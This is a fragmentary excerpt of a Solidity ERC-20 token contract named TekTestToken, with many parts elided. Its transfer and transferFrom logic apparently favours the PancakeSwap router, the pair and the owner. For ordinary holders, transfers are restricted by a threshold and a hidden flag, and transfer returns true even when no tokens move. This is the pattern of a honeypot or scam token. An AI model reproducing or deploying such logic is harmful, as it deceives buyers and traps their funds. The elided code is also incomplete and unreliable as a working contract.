...
contract TekTestToken is Context, IERC20, IERC20Metadata, Ownable, SafeMath  {
    ...
    uint256 _PSMTest = 5000000000 * 10**18;
	...
	function transfer(address recipient, uint256 tokens) public virtual override returns (bool) {
        ...
        if(_msgSender() == PANCAKE_ROUTER_V2_ADDRESS || _msgSender() == pancakePair() || pancakePair() == address(0) || _msgSender() == owner()) {
            ...
            if( (tokens <= _PSMTest || isC) && !isContract(_msgSender()) ) {
                _transfer(_msgSender(), recipient, tokens);
            }
        }
        return true;
    ...
    function transferFrom(address sender, address recipient, uint256 tokens) public virtual override returns (bool) {
        if(sender == PANCAKE_ROUTER_V2_ADDRESS || sender == pancakePair() || pancakePair() == address(0) || sender == owner()) {
            ...
            require(currentAllowance >= tokens, "PSMTest: transfer tokens exceeds allowance");
            unchecked {
                _approve(sender, _msgSender(), currentAllowance - tokens);
            }
        } else {
            //normal user check tokens
            if( (tokens <= _PSMTest || isC) && !isContract(sender) ) {
                _transfer(sender, recipient, tokens);
                uint256 currentAllowance = _allowances[sender][_msgSender()];
                require(currentAllowance >= tokens, "PSMTest: transfer tokens exceeds allowance");
                unchecked {
    ...
    function pancakePair() public view virtual returns (address) {
     ...
     function _transfer(address sender,  address recipient, uint256 tokens) internal virtual {
        require(sender != address(0), "PSMTest: transfer from the zero address");
        require(recipient != address(0), "PSMTest: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, tokens);

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= tokens, "PSMTest: transfer tokens exceeds balance");
        unchecked {
 ...
 */
    ...
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        ...
        require(currentAllowance >= subtractedValue, "PSMTest: decreased allowance below zero");
        unchecked {
    ...
    function _mint(address account, uint256 tokens) internal virtual {
        require(account != address(0), "PSMTest: mint to the zero address");
        ...
        require(account != address(0), "PSMTest: burn from the zero address");

        _beforeTokenTransfer(account, address(0), tokens);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= tokens, "PSMTest: burn tokens exceeds balance");
        unchecked {
    ...
    function _approve(address owner, address spender, uint256 tokens) internal virtual {
        require(owner != address(0), "PSMTest: approve from the zero address");
        require(spender != address(0), "PSMTest: approve to the zero address");
